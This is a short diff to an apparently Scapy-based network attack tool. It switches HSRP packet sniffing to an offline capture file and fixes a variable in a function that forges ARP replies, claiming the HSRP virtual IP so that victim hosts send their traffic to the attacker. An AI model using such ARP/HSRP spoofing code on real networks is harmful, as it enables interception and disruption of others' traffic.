@@ -42,7 +42,7 @@ pkcopy: Packet
 def find_hsrp():
     #consider offline="filename" to test with pcap file
     print("Listening for active HSRP packets on UDP port 1985...")
-    sniff(prn=check_hsrp, filter="udp and udp dst port 1985", stop_filter=hsrp_found)
+    sniff(prn=check_hsrp, filter="udp and udp dst port 1985", stop_filter=hsrp_found, offline="hsrp v1.pcap")
     if hsrpfound:
         return True
     return False
@@ -201,7 +201,7 @@ def arp_respond(pkt):
     if attackportsecurity:
         ethersrc = mymac
     else:
-        ethersrc = packet[Ether].src
+        ethersrc = pkcopy[Ether].src
     victimEther = pkt[Ether].src
     victimIP = pkt[ARP].psrc
     pkttosend = Ether(dst=victimEther)/ARP(op=2, psrc=virtualIP, hwdst=victimEther, pdst=victimIP)
